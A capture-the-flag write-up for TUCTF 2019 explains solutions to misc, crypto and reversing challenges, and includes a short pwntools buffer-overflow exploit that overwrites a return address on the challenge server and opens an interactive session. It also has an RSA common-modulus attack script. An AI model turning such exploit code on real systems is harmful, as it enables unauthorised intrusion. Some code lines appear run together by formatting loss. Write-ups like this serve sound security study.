# MISC
# Brain Games
I had a hard time automating this since it blacked out my entire terminal, so I just opened python and solved the three tasks quickly.

# Red Yarn
```bash
strings DEBUG.COM | grep "TU"
```
# Super Secret
```basha0su@a0su:~/Documents/CTF/2019/TUCTF/Misc/SuperSecret$ binwalk -e document.odt 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, compressed size: 39, uncompressed size: 39, name: mimetype77            0x4D            Zip archive data, at least v2.0 to extract, name: manifest.rdf
396           0x18C           Zip archive data, at least v2.0 to extract, name: Configurations2/progressbar/
454           0x1C6           Zip archive data, at least v2.0 to extract, name: Configurations2/toolbar/508           0x1FC           Zip archive data, at least v2.0 to extract, name: Configurations2/statusbar/
564           0x234           Zip archive data, at least v2.0 to extract, name: Configurations2/toolpanel/
620           0x26C           Zip archive data, at least v2.0 to extract, name: Configurations2/popupmenu/676           0x2A4           Zip archive data, at least v2.0 to extract, name: Configurations2/images/Bitmaps/
737           0x2E1           Zip archive data, at least v2.0 to extract, name: Configurations2/accelerator/795           0x31B           Zip archive data, at least v2.0 to extract, name: Configurations2/floater/
849           0x351           Zip archive data, at least v2.0 to extract, name: Configurations2/menubar/
903           0x387           Zip archive data, at least v2.0 to extract, name: content.xml2097          0x831           Zip archive data, at least v2.0 to extract, name: styles.xml
4206          0x106E          Zip archive data, at least v2.0 to extract, name: meta.xml
4714          0x126A          Zip archive data, at least v2.0 to extract, name: Basic/Standard/flag.xml
5051          0x13BB          Zip archive data, at least v2.0 to extract, name: Basic/Standard/script-lb.xml
5337          0x14D9          Zip archive data, at least v2.0 to extract, name: Basic/script-lc.xml
5613          0x15ED          Zip archive data, at least v2.0 to extract, name: settings.xml
7356          0x1CBC          Zip archive data, at least v2.0 to extract, compressed size: 3983, uncompressed size: 3983, name: Thumbnails/thumbnail.png
11393         0x2C81          Zip archive data, at least v2.0 to extract, name: META-INF/manifest.xml
13126         0x3346          End of Zip archive, footer length: 22

a0su@a0su:~/Documents/CTF/2019/TUCTF/Misc/SuperSecret$ cd _document.odt.extracted/
a0su@a0su:~/Documents/CTF/2019/TUCTF/Misc/SuperSecret/_document.odt.extracted$ ls
0.zip  Configurations2  manifest.rdf  meta.xml  settings.xml  Thumbnails
Basic  content.xml      META-INF      mimetype  styles.xml
a0su@a0su:~/Documents/CTF/2019/TUCTF/Misc/SuperSecret/_document.odt.extracted$ cd Basic/Standard/
a0su@a0su:~/Documents/CTF/2019/TUCTF/Misc/SuperSecret/_document.odt.extracted/Basic/Standard$ ls
flag.xml  script-lb.xml
a0su@a0su:~/Documents/CTF/2019/TUCTF/Misc/SuperSecret/_document.odt.extracted/Basic/Standard$ strings flag.xml | grep "TU"
TUCTF{ST0P_TRUST1NG_M4CR0S_FR0M_4N_UNKN0WN_S0URC3}
a0su@a0su:~/Documents/CTF/2019/TUCTF/Misc/SuperSecret/_document.odt.extracted/Basic/Standard$ 
```
	
# PWN
# Run Me
Just run the binary

# Thefirst
Buffer Overflow and rewrite the return address
```python
from pwn import * 
pad = "A" * 24
add = p32(0x080491f6)r = remote('chal.tuctf.com',30508)
r.sendline(pad+add)
r.interactive()
```


# CRYPTO
# Sonic
In this challenge we NC and a presented with an ASCII sonic and are to decrypt the given ciphertext in under a few seconds. After I realized they were applying a rotation of the alphabet by some number n, I decided to brute force all permutations and then used PyEnchant to check if a permutation was a word in the English language if it was I sent it over. 
```python
#!/usr/bin/python3
from pwn import *import enchant

d = enchant.Dict("en_US")
#r = remote('chal.tuctf.com', 30100)
#s = r.recv()
#print(s)s = 'pmttw'

def rot_alpha(n):    from string import ascii_lowercase as lc, ascii_uppercase as uc    lookup = str.maketrans(lc + uc, lc[n:] + lc[:n] + uc[n:] + uc[:n])
    return lambda s: s.translate(lookup)
for i in range(1,25):    if(d.check(rot_alpha(i)(s))):
        #r.sendline(rot_alpha(i)(s))
        print(rot_alpha(i)(s))
```

# Warren
This challenge provides five different ciphertexts using the following methods: baconian, caesar, vigenere, atbash, and affine. Since these did not change each you connected I solved statically and submitted. The only difficult part was vigenere since we did not know the key, but I used dcode and provided a known portion of the plaintext to be vigenere since it followed as a pattern in the previous messages.

# Something in Common
The given information shows two ciphertext, two public keys, and a single common modulus. With this information we can apply bezout's identity using the extended euclidean algorithm. Which states that there are two coefficients, which we can call a and b, such that a * e1 + b * e2 = gcd(e1,e2). We also know that the gcd of our public keys, 13 and 15, is 1 since they are coprime. 
```python
from fractions import gcd
n = 5196832088920565976847626600109930685983685377698793940303688567224093844213838345196177721067370218315332090523532228920532139397652718602647376176214689

e1 = 15
e2 = 13

c1 = 2042084937526293083328581576825435106672034183860987592520636048680382212041801675344422421233222921527377650749831658168085014081281116990629250092000069

c2 = 199621218068987060560259773620211396108271911964032609729865342591708524675430090445150449567825472793342358513366241310112450278540477486174011171344408
def egcd(a, b):
    if a == 0:        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise ValueError('Modular inverse does not exist.')
    else:
        return x % m

def attack(c1, c2, e1, e2, N):
    if gcd(e1, e2) != 1:
        raise ValueError("Exponents e1 and e2 must be coprime")
    s1 = modinv(e1,e2)
    s2 = (gcd(e1,e2) - e1 * s1) / e2
    temp = modinv(c2, N)
    m1 = pow(c1,s1,N)
    m2 = pow(temp,-s2,N)
    return (m1 * m2) % N


def main():
    try:
        message = attack(c1, c2, e1, e2, n)
        print '\nPlaintext message:\n%s' % format(message, 'x').decode('hex')
    except Exception as e:
        print e.message

main()
```
	
# REVERSING
# faker
The challenge provides a menu where we can decrypt three fake flags. Opening in Ghidra we find the decryption function and decompile it. Replicating this in python we can take the actual encrypted flag from memory and decrypt it using the following:
```
def printFlag(s):
   o = ''
   for i in range(len(s)):
       o += chr(((((ord(s[i]) ^ 0xf) - 0x1d) * 8) % 0x5f) + ord(' '))
   return o
   
if __name__ == '__main__':
    s = "\\PJ\\fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k"
    print(printFlag(s))
```
# core
Given a core dump I look for where the binary is ran and then for its subsequent output. The given .c shows they XOR the flag with 1 and output it. To easily find its output we can use the known flag format ```TUCTF{}```, we can find T ^ 1 to be U, which means ```UTBUGzb1s2^etlq>^O2w2s^i25se^1g^x1t|``` is our encrypted flag.

```python
s = 'UTBUGzb1s2^etlq>^O2w2s^i25se^1g^x1t|'
o=''
for i in range(len(s)):
    o += chr(ord(s[i]) ^ 1)
print(o)
```

	
